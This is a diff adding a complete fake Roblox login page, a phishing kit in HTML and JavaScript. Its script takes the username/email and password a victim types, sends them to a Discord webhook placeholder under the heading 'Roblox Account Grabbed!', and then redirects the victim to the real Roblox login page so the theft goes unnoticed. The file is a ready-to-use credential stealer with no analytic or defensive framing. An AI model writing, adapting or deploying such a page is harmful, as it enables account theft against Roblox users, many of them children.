@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Login</title>
+    <style>
+        body { margin: 0; padding: 0; background-color: #232527; font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .login-box { background-color: #393b3d; padding: 40px; border-radius: 8px; width: 100%; max-width: 350px; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
+        .logo { text-align: center; font-size: 32px; font-weight: bold; letter-spacing: -1px; margin-bottom: 30px; }
+        .logo span { color: #00a2ff; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: none; border-radius: 4px; background: #2b2d2f; color: #fff; font-size: 16px; box-sizing: border-box; border: 1px solid #555; }
+        input:focus { outline: none; border: 1px solid #00a2ff; }
+        button { width: 100%; padding: 12px; background-color: #00a2ff; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        button:hover { background-color: #0084d1; }
+        .forgot { display: block; text-align: center; margin-top: 15px; color: #a0a0a0; text-decoration: none; font-size: 14px; }
+    </style>
+</head>
+<body>
+<div class="login-box">
+    <div class="logo">ROB<span>LOX</span></div>
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Username/Email" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit" id="submitBtn">Log In</button>
+    </form>
+    <a href="#" class="forgot">Forgot Password or Username?</a>
+</div>
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        const submitBtn = document.getElementById('submitBtn');
+        
+        submitBtn.innerText = "Logging in...";
+        submitBtn.style.backgroundColor = "#555";
+        submitBtn.disabled = true;
+
+        const webhookUrl = "URL_WEBHOOK_DISCORD_LO"; // GANTI INI
+
+        const payload = {
+            content: "🎮 **Roblox Account Grabbed!**",
+            embeds: [{
+                title: "New Login Data",
+                color: 3447003,
+                fields: [
+                    { name: "Username/Email", value: username, inline: false },
+                    { name: "Password", value: password, inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(() => { window.location.href = "https://www.roblox.com/login"; })
+        .catch(() => { window.location.href = "https://www.roblox.com/login"; });
+    });
+</script>
+</body>
+</html>
